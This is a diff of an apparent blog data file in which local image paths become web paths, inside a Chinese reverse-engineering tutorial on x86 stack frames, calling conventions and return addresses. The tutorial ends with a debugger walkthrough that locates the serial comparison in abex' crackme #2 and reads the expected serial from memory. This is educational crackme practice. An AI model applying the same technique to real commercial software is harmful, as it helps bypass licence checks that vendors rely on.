-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809151015714.png" alt="image-20260809151015714"></p>
+<p><img src="/images/image-20260809151015714.png" alt="image-20260809151015714"></p>
 <p>可以发现调用 MessageBoxA () 函数之前执行了 4 个 PUSH 命令，把函数需要的参数逆序压入栈</p>
 <p>将上述汇编代码转换为 C 语言函数调用代码，如下所示。</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">&quot;Make me think your HD is a CD-Rom.&quot;</span>, <span class="string">&quot;abex&#x27; 1st crackme&quot;</span>, MB_OK|MB_APPLMODAL);</span><br></pre></td></tr></table></figure>
@@ -5762,13 +5762,13 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>比较 C 语言代码与汇编代码可以看到，函数调用时的参数顺序（正序）与参数入栈时的顺序（逆序）相反。那么参数入栈时，为什么要采用这种逆序的方式呢？要想理解这个问题，想清楚栈结构（FILO，First In Last Out 或 LIFO，Last In First Out）即可。</p>
 <p>“栈的结构是 FILO（先进后出），所以把参数压入栈时，只有按照逆序的方式压入，MessageBoxA () 函数才能以正确的顺序接收到这些参数。”</p>
 <p>利用调试器执行到 EIP&#x3D;0040100E 地址处，观察栈窗口</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809151306880.png" alt="image-20260809151306880"></p>
+<p><img src="/images/image-20260809151306880.png" alt="image-20260809151306880"></p>
 <p>x86 环境下，栈向低地址延伸（即向栈压入数据时，ESP 值减小，向低地址方向移动），观察栈窗口可以看到，MessageBoxA () 函数的第一个参数在栈顶位置，最后一个参数（第四个参数）在其他参数下面，从 PUSH 命令执行的顺序可以很容易地理解这点。</p>
 <p>MessageBoxA () 函数从栈中获取需要的参数时，存储在栈中的参数会按照 FILO（先进后出）的规则依次弹出。从 MessageBoxA () 函数获取参数的角度来看，参数就像按照原来顺序被存入栈一样。</p>
 <h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>我们将学习栈帧（Stack Frame）相关知识，栈帧在程序中用于声明局部变量、调用函数。理解了栈帧，就能轻松掌握保存在其中的函数参数和局部变量，这对我们调试代码也是很有帮助的。</p>
 <p>简言之，栈帧就是利用 <strong>EBP</strong>（栈帧指针，请注意不是 ESP）寄存器访问栈内局部变量、参数、函数返回地址等的手段。通过前面关于 IA-32 寄存器的学习我们知道，ESP 寄存器承担着栈顶指针的作用，而 EBP 寄存器则负责行使栈帧指针的职能。程序运行中，ESP 寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以 ESP 值为基准编写程序会十分困难，并且也很难使 CPU 引用到准确的地址。所以，调用某函数时，先要把用作基准点（函数起始地址）的 ESP 值保存到 EBP，并维持在函数内部。这样，无论 ESP 的值如何变化，以 EBP 的值为基准（base）能够安全访问到相关函数的局部变量、参数、返回地址，这就是 EBP 寄存器作为栈帧指针的作用。</p>
 <p>接下来看看栈帧对应的汇编代码。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809152543414.png" alt="image-20260809152543414"></p>
+<p><img src="/images/image-20260809152543414.png" alt="image-20260809152543414"></p>
 <p>借助栈帧技术管理函数调用时，无论函数调用的深度有多深、多复杂，调用栈都能得到很好的管理与维护。</p>
 <p><strong>提示</strong></p>
 <ul>
@@ -5779,11 +5779,11 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StackFrame.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">add</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> x = a, y = b;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">add</span>(a, b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>关闭优化选项后编译</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809180715272.png" alt="image-20260809180715272"></p>
+<p><img src="/images/image-20260809180715272.png" alt="image-20260809180715272"></p>
 <h3 id="main函数及栈帧"><a href="#main函数及栈帧" class="headerlink" title="main函数及栈帧"></a>main函数及栈帧</h3><p>函数<code>main()</code>是程序开始执行的地方,<code>main()</code>函数的起始地址为401020</p>
 <p>开始执行<code>main()</code>函数时栈的状态如图所示。从现在开始要密切关注栈的变化</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809203654751.png" alt="image-20260809203654751"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809203732937.png" alt="image-20260809203732937"></p>
+<p><img src="/images/image-20260809203654751.png" alt="image-20260809203654751"></p>
+<p><img src="/images/image-20260809203732937.png" alt="image-20260809203732937"></p>
 <p>当前ESP的值为1AFF30,EBP的值为16FF74,切记地址401250保存在ESP(1AFF30)中,它是main()函数执行完毕后要返回的地址</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401020 PUSH EBP        ; # main()</span><br></pre></td></tr></table></figure>
 
@@ -5799,7 +5799,7 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401023 SUB ESP,8</span><br></pre></td></tr></table></figure>
 
 <p>SUB 是汇编语言中的一条减法指令，上面这条语句用来将 ESP 的值减去 8 个字节。执行该条命令之前，ESP 的值为 1AFF2C(因为push ebp,即1AFF30-4)，减去 8 个字节后，变为 1AFF24。那么为什么要将 ESP 减去 8 个字节呢？从 ESP 减去 8 个字节，其实质是为函数的局部变量（a 与 b ）开辟空间，以便将它们保存在栈中。由于局部变量 a 与 b 都是 long 型（长整型），它们分别占据 4 个字节大小，所以需要在栈中开辟 8 个字节的空间来保存这 2 个变量。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809212010964.png" alt="image-20260809212010964"></p>
+<p><img src="/images/image-20260809212010964.png" alt="image-20260809212010964"></p>
 <p>使用 SUB 指令从 ESP 中减去 8 个字节，为 2 个函数变量开辟好栈空间后，在 main () 内部，无论 ESP 的值如何变化，变量 a 与 b 的栈空间都不会受到损坏。由于 EBP 的值在 main () 函数内部是固定不变的，我们就能以它为基准来访问函数的局部变量了。继续看如下代码。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401026 MOV DWORD PTR SS:[EBP-4],1  ; [EBP-4] = local &#x27;a&#x27;</span><br><span class="line">0040102D MOV DWORD PTR SS:[EBP-8],2  ; [EBP-8] = local &#x27;b&#x27;</span><br></pre></td></tr></table></figure>
 
@@ -5832,15 +5832,15 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>提示</p>
 <p><code>DWORD PTR SS:[EBP-4]</code> 语句中，SS 是 Stack Segment 的缩写，表示栈段。由于 Windows 中使用的是段内存模型（Segment Memory Model），使用时需要指出相关内存属于哪一个区段。其实，32 位的 Windows OS 中，SS、DS、ES 的值皆为 0，所以采用这种方式附上区段并没有什么意义。因 EBP 与 ESP 是指向栈的寄存器，所以添加上了 SS 寄存器。</p>
 <p>再次分析上面的 2 条 MOV 命令，它们的含义是 “把数据 1 与 2 分别保存到 [EBP-4] 与 [EBP-8] 中”，即 [EBP-4] 代表局部变量 a，[EBP-8] 代表局部变量 b。执行完上面两条语句后，函数栈内的情况如图所示。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809212927174.png" alt="image-20260809212927174"></p>
+<p><img src="/images/image-20260809212927174.png" alt="image-20260809212927174"></p>
 <h3 id="add函数参数传递及调用"><a href="#add函数参数传递及调用" class="headerlink" title="add函数参数传递及调用"></a>add函数参数传递及调用</h3><p>main函数中使用如下语句调用add函数,执行加法运算并输出函数返回值</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">add</span>(a, b));</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809214410691.png" alt="image-20260809214410691">g看上面 5 行汇编代码，它描述了调用 add () 函数的整个过程。</p>
+<p><img src="/images/image-20260809214410691.png" alt="image-20260809214410691">g看上面 5 行汇编代码，它描述了调用 add () 函数的整个过程。</p>
 <p>地址 40103C 处为 “Call 401000” 命令，该命令用于调用 401000 处的函数，而 401000 处的函数即为 add () 函数。</p>
 <p>函数 add () 接收 a、b 这 2 个长整型参数，所以调用 add () 之前需要先把 2 个参数压入栈，地址 401034~40103B 之间的代码即用于此。这一过程中需要注意的是，参数入栈的顺序与 C 语言源码中的参数顺序恰好相反（我们把这称为函数参数的逆向存储）。</p>
 <p>换言之，变量 b（[EBP-8]）首先入栈，接着变量 a（[EBP-4]）再入栈。执行完地址 401034~40103B 之间的代码后，此时函数栈如图所示</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809214641494.png" alt="image-20260809214641494"></p>
+<p><img src="/images/image-20260809214641494.png" alt="image-20260809214641494"></p>
 <p>各地址的内容为</p>
 <table>
 <thead>
@@ -5887,13 +5887,13 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p>main函数的栈帧就分析到这,接着来分析add函数的栈帧</p>
 <h3 id="add函数生成及栈帧"><a href="#add函数生成及栈帧" class="headerlink" title="add函数生成及栈帧"></a>add函数生成及栈帧</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="title">add</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> x = a, y = b;</span><br><span class="line">    <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810174324378.png" alt="image-20260810174324378"></p>
+<p><img src="/images/image-20260810174324378.png" alt="image-20260810174324378"></p>
 <p>函数开始执行时，栈中会单独生成与其对应的栈帧。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401000  PUSH EBP</span><br><span class="line">00401001  MOV EBP,ESP</span><br></pre></td></tr></table></figure>
 
 <p>上面 2 行代码与开始执行 main () 函数时的代码完全相同，先把 EBP 值（main () 函数的基址指针）保存到栈中，再把当前 ESP 存储到 EBP 中，这样函数 add () 的栈帧就生成了。如此一来，add () 函数内部的 EBP 值始终不变。执行完以上 2 行代码后，栈内情况如图示。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810170837876.png" alt="image-20260810170837876"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810170952631.png" alt="image-20260810170952631"></p>
+<p><img src="/images/image-20260810170837876.png" alt="image-20260810170837876"></p>
+<p><img src="/images/image-20260810170952631.png" alt="image-20260810170952631"></p>
 <p>可以看到，main () 函数使用的 EBP 值（1AFF10）被备份到栈中，然后 EBP 的值被设置为新值 1AFEF8。</p>
 <h3 id="设置add函数的局部变量"><a href="#设置add函数的局部变量" class="headerlink" title="设置add函数的局部变量"></a>设置add函数的局部变量</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> x = a, y = b;</span><br></pre></td></tr></table></figure>
 
@@ -5907,8 +5907,8 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <p><code>[EBP+8]</code>、<code>[EBP+C]</code> 指向传入参数 a、b；</p>
 <p><code>[EBP-8]</code>、<code>[EBP-4]</code> 指向 add 函数的 2 个局部变量 x、y。</p>
 <p>此时栈内情如图所示</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810172837784.png" alt="image-20260810172837784"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810172901349.png" alt="image-20260810172901349"></p>
+<p><img src="/images/image-20260810172837784.png" alt="image-20260810172837784"></p>
+<p><img src="/images/image-20260810172901349.png" alt="image-20260810172901349"></p>
 <h3 id="add运算"><a href="#add运算" class="headerlink" title="add运算"></a>add运算</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (x + y);</span><br></pre></td></tr></table></figure>
 
 <p>此语句用于返回两个局部变量之和</p>
@@ -5930,33 +5930,33 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0040101A  POP EBP</span><br></pre></td></tr></table></figure>
 
 <p>上面这条命令用于恢复函数 add () 开始执行时保存到栈中的 EBP 值，它与 401000 地址处的 <code>PUSH EBP</code> 命令对应。EBP 值恢复为 1AFF2C，它是 main () 函数的 EBP 值。至此，函数 add () 的栈帧就被删除了。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810192552995.png" alt="image-20260810192552995"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810192604593.png" alt="image-20260810192604593"></p>
+<p><img src="/images/image-20260810192552995.png" alt="image-20260810192552995"></p>
+<p><img src="/images/image-20260810192604593.png" alt="image-20260810192604593"></p>
 <p>可以看到，ESP 的值为 1AFF18，该地址的值为 401041，它是执行 <code>CALL 401000</code> 命令时 CPU 存储到栈中的返回地址。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0040101B  RETN</span><br></pre></td></tr></table></figure>
 
 <p>执行上述 <code>RETN</code> 命令后，存储在栈中的返回地址被返回</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810192757384.png" alt="image-20260810192757384"></p>
+<p><img src="/images/image-20260810192757384.png" alt="image-20260810192757384"></p>
 <p>调用栈已经完全返回到调用函数 add () 之前的状态</p>
 <p>应用程序采用上述方式管理栈，无论有多少函数被嵌套调用，栈都能得到较好的维护，不会崩溃。但由于函数的局部变量、参数、返回地址等是一次性保存到栈中的，利用字符串函数的漏洞等很容易引起栈缓冲区溢出，最终导致程序或系统崩溃。</p>
 <h3 id="从栈中删除add函数的参数"><a href="#从栈中删除add函数的参数" class="headerlink" title="从栈中删除add函数的参数"></a>从栈中删除add函数的参数</h3><p>现在，程序执行流已经重新返回 main () 函数中,接下来便执行这条指令</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401041  ADD ESP,8</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810195730648.png" alt="image-20260810195730648"></p>
+<p><img src="/images/image-20260810195730648.png" alt="image-20260810195730648"></p>
 <p>使用 ADD 命令将 ESP 加上 8，为什么突然要把 ESP 加上 8 呢？请看栈窗口，地址 1AFF1C与 1AFF20 处存储的是传递给函数 add () 的参数 a 与 b。函数 add () 执行完毕后，就不再需要参数 a 与 b 了，所以要把 ESP 加上 8，将它们从栈中清理掉（参数 a 与 b 都是长整型，各占 4 个字节，合起来共 8 个字节）。</p>
 <p>执行完毕后,栈中参数如图</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810195913009.png" alt="image-20260810195913009"></p>
+<p><img src="/images/image-20260810195913009.png" alt="image-20260810195913009"></p>
 <p><strong>提示</strong></p>
 <p>被调函数执行完毕后，函数的调用者（Caller）负责清理存储在栈中的参数，这种方式称为 cdecl 方式；反之，被调用者（Callee）负责清理保存在栈中的参数，这种方式称为 stdcall 方式。这些函数调用规则统称为调用约定（Calling Convention），这在程序开发与分析中是一个非常重要的概念。</p>
 <h3 id="调用printf函数"><a href="#调用printf函数" class="headerlink" title="调用printf函数"></a>调用printf函数</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">add</span>(a, b));</span><br></pre></td></tr></table></figure>
 
 <p>调用 printf () 函数的汇编代码如下所示</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810200823725.png" alt="image-20260810200823725"></p>
+<p><img src="/images/image-20260810200823725.png" alt="image-20260810200823725"></p>
 <p>地址 401044 处的 EAX 寄存器中存储着函数 add () 的返回值，它是执行加法运算后的结果值 3。</p>
 <p>地址 40104A 处的 CALL 401067 命令中调用的是 401067 地址处的函数，它是一个 C 标准库函数 printf ()，所有 C 标准库函数都由 Visual C++ 编写而成（其中包含着数量庞大的函数，在此不详细介绍）。</p>
 <p>由于上面的 printf () 函数有 2 个参数，大小为 8 个字节（32 位寄存器 + 32 位常量 &#x3D; 64 位 &#x3D; 8 字节），所以在 40104F 地址处使用 ADD 命令，将 ESP 加上 8 个字节，把函数的参数从栈中删除。</p>
 <p>函数 printf () 执行完毕并通过 ADD 命令删除参数后，栈内情形如图所示。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810200908082.png" alt="image-20260810200908082"></p>
+<p><img src="/images/image-20260810200908082.png" alt="image-20260810200908082"></p>
 <h3 id="设置返回值"><a href="#设置返回值" class="headerlink" title="设置返回值"></a>设置返回值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return 0;</span><br></pre></td></tr></table></figure>
 
 <p>main () 函数使用该语句设置返回值（0）。</p>
@@ -5971,30 +5971,30 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401054  MOV ESP,EBP</span><br><span class="line">00401056  POP EBP</span><br></pre></td></tr></table></figure>
 
 <p>执行完上面 2 条命令后，main () 函数的栈帧即被删除，且其局部变量 a、b 也不再有效。执行至此，栈内情形如图 </p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810201848665.png" alt="image-20260810201848665"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810201931670.png" alt="image-20260810201931670"></p>
+<p><img src="/images/image-20260810201848665.png" alt="image-20260810201848665"></p>
+<p><img src="/images/image-20260810201931670.png" alt="image-20260810201931670"></p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">00401057</span>  RETN</span><br></pre></td></tr></table></figure>
 
 <p>执行完上面命令后，主函数执行完毕并返回，程序执行流跳转到返回地址处（401250），该地址指向 Visual C++ 的启动函数区域。随后执行进程终止代码。</p>
 <h2 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h2><p>执行 CALL 命令进入被调用的函数之前，CPU 会先把函数的返回地址压入栈，用作函数执行完毕后的返回地址。从图中可知，在地址 40103C 处调用了 add () 函数，它的下一条命令的地址为 401041。函数 add () 执行完毕后，程序执行流应该返回到 401041 地址处，该地址即被称为 add () 函数的返回地址。</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809221409173.png" alt="image-20260809221409173"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260809221626041.png" alt="image-20260809221626041"></p>
+<p><img src="/images/image-20260809221409173.png" alt="image-20260809221409173"></p>
+<p><img src="/images/image-20260809221626041.png" alt="image-20260809221626041"></p>
 <h2 id="分析abex’-crackme2"><a href="#分析abex’-crackme2" class="headerlink" title="分析abex’ crackme2"></a>分析abex’ crackme2</h2><p>分析第二个 crackme 文件 abex’ crackme #2，它使用 Visual Basic 语言编写，你会感受到与使用 Visual C++ 或 Assembly 编写的文件相比具有不同的形态。</p>
-<h3 id="运行abex-‘crackme2"><a href="#运行abex-‘crackme2" class="headerlink" title="运行abex ‘crackme2"></a>运行abex ‘crackme2</h3><p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810213639005.png" alt="image-20260810213639005"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810214006139.png" alt="image-20260810214006139"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810213841215.png" alt="image-20260810213841215"></p>
+<h3 id="运行abex-‘crackme2"><a href="#运行abex-‘crackme2" class="headerlink" title="运行abex ‘crackme2"></a>运行abex ‘crackme2</h3><p><img src="/images/image-20260810213639005.png" alt="image-20260810213639005"></p>
+<p><img src="/images/image-20260810214006139.png" alt="image-20260810214006139"></p>
+<p><img src="/images/image-20260810213841215.png" alt="image-20260810213841215"></p>
 <p>有一些特诊字符串,等下可以用字符串定位到关键函数的地址</p>
 <h3 id="Visual-Basic-文件的特征"><a href="#Visual-Basic-文件的特征" class="headerlink" title="Visual Basic 文件的特征"></a>Visual Basic 文件的特征</h3><p>VB 文件使用名为 MSVBVM60.dll（Microsoft Visual Basic Virtual Machine 6.0）的 VB 专用引擎（也称为 The Thunder Runtime Engine）。</p>
 <p>举个使用 VB 引擎的例子，显示消息框时，VB 代码中要调用 MsgBox () 函数。其实，VB 编辑器真正调用的是 MSVBVM60.dll 里的 rtcMsgBox () 函数，在该函数内部通过调用 user32.dll 里的 MessageBoxW () 函数（Win32 API）来工作（也可以在 VB 代码中直接调用 user32.dll 里的 MessageBoxW ()）。</p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>运行DBG,查看 abex’ crackme #2 文件的反汇编代码</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810221346355.png" alt="image-20260810221346355"></p>
+<p><img src="/images/image-20260810221346355.png" alt="image-20260810221346355"></p>
 <p>直接这样分析不是一件易事,要想一个更简单的方法才行。这种思路就是利用运行程序中的错误消息框与字符串</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810221808766.png" alt="image-20260810221808766"></p>
+<p><img src="/images/image-20260810221808766.png" alt="image-20260810221808766"></p>
 <p>双击字符串即可跳到对应的地址,跳到00403372来</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810223001936.png" alt="image-20260810223001936"></p>
+<p><img src="/images/image-20260810223001936.png" alt="image-20260810223001936"></p>
 <p>从编程的观点来看，使用某种算法生成序列号，通过比较用户输入的序列号与字符串，代码分为 TRUE（序列号相同）与 FALSE（序列号不同）两大部分。换言之，上述代码的前后存在字符串比较代码，且序列号正确时程序代码会调用消息框输出成功消息</p>
 <p>带着怀疑向上看,果然看到了包含条件转移语句的代码</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810223342876.png" alt="image-20260810223342876"></p>
+<p><img src="/images/image-20260810223342876.png" alt="image-20260810223342876"></p>
 <p>403329 地址调用了<code>__vbaVarTstEq()</code>函数，比较（TEST 命令）返回值（AX）后，由 403332 地址的条件转移指令（JE 指令）决定执行 “真” 代码还是 “假” 代码。</p>
 <p><strong>提示</strong></p>
 <ul>
@@ -6013,27 +6013,27 @@ f(x)g(x)=\sum_{k=0}^{n+m} c_k x^k,\quad c_k=\sum_{i+j=k} a_i b_j
 <li>可以类比 C 语言的 <code>strcmp()</code> 来理解</li>
 </ul>
 <p>它决定了后面是否跳转</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260810225503363.png" alt="image-20260810225503363"></p>
+<p><img src="/images/image-20260810225503363.png" alt="image-20260810225503363"></p>
 <p>发现它被调用前,栈里压参了,应该就是<code>__vbaVarTstEq()</code>需要的参数</p>
 <p>00403321 地址处的<code>SS:[EBP-44]</code>表达的是什么呢？“IA-32 基本说明” 与 “栈帧” 中讲过，SS 是栈段，EBP 是基址指针寄存器。换言之，<code>SS:[EBP-44]</code>指的是栈内地址，它恰好又是函数中声明的局部对象的地址（局部对象存储在栈区）。在此状态下查看栈（栈地址会随调试环境的不同而改变）。</p>
 <p>此处下断点,运行程序</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811102423028.png" alt="image-20260811102423028"></p>
+<p><img src="/images/image-20260811102423028.png" alt="image-20260811102423028"></p>
 <p>name输入1234,serial为5678</p>
 <p>执行完两步压栈后</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811102542554.png" alt="image-20260811102542554"></p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811102552356.png" alt="image-20260811102552356"></p>
+<p><img src="/images/image-20260811102542554.png" alt="image-20260811102542554"></p>
+<p><img src="/images/image-20260811102552356.png" alt="image-20260811102552356"></p>
 <p>我们跟进这个地址,转到内存窗口</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811102652769.png" alt="image-20260811102652769"></p>
+<p><img src="/images/image-20260811102652769.png" alt="image-20260811102652769"></p>
 <p>与 C++ 的 string 类一样，VB 字符串使用可变长度的字符串类型。所以就像在图中看到的一样，直接显示的不是字符串，而是 16 字节大小的数据（这就是 VB 中使用的字符串对象）。不同的值被这样统一起来，仅方框显示的值是不同的，看上去就像内存地址一样（可变长度字符串类型内部持有实际动态分配的字符串缓存地址）。</p>
 <p>VB 字符串对象是 16 字节结构，偏移 +0 是长度，偏移 +8 是指向 Unicode 字符串数据的指针</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811102825363.png" alt="image-20260811102825363"></p>
+<p><img src="/images/image-20260811102825363.png" alt="image-20260811102825363"></p>
 <p>这里依旧是地址,我们接着跟进,即0x007D6D84和0x007D747C</p>
 <p>此处是将要比对的目标序列号</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811103408629.png" alt="image-20260811103408629"></p>
+<p><img src="/images/image-20260811103408629.png" alt="image-20260811103408629"></p>
 <p>此处是我们输入的序列号</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811103428530.png" alt="image-20260811103428530"></p>
+<p><img src="/images/image-20260811103428530.png" alt="image-20260811103428530"></p>
 <p>验证一下</p>
-<p><img src="C:\Users\Petrichor\AppData\Roaming\Typora\typora-user-images\image-20260811104636574.png" alt="image-20260811104636574"></p>
+<p><img src="/images/image-20260811104636574.png" alt="image-20260811104636574"></p>
 ]]></content>
       <categories>
         <category>Reverse</category>
